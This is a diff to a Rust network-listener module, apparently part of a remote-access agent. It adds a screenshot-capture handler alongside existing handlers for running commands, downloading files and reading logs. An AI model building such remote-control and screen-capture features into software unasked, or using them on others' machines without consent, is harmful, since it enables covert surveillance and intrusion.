@@ -5,10 +5,7 @@ use log::{debug, info, error};
 
 use ron;
 
-use crate::communication::messages::{
-    DownloadFileRequest, GetBasicInfoRequest, Message, MessageType, MessageTypes,
-    RunCommandRequest, MESSAGE_HEADER_LENGTH,
-};
+use crate::communication::messages::{DownloadFileRequest, GetBasicInfoRequest, Message, MessageType, MessageTypes, RunCommandRequest, MESSAGE_HEADER_LENGTH, GetScreenshotResponse};
 use crate::communication::serialization::{extract_msg_type_and_length, serialize_message};
 use serde::Serialize;
 
@@ -16,6 +13,7 @@ use crate::actions::basic_info::{download_file_message, get_basic_info_request};
 use crate::actions::commands::run_command_message;
 use num_traits::FromPrimitive;
 use crate::actions::log_actions::get_logs_request;
+use crate::actions::screenshot_actions::get_screenshot_request;
 
 pub const BIND_ANY: &str = "0.0.0.0";
 
@@ -51,6 +49,10 @@ fn handle_message(message: Message, stream: &TcpStream) {
         },
         Some(MessageTypes::GetLogsRequest) => {
             let response = get_logs_request();
+            send_response(response, stream).unwrap();
+        },
+        Some(MessageTypes::GetScreenshotRequest) => {
+            let response: GetScreenshotResponse = get_screenshot_request();
             send_response(response, stream).unwrap();
         }
         _ => error!("Unrecognized message type '{}'", message.get_type()),
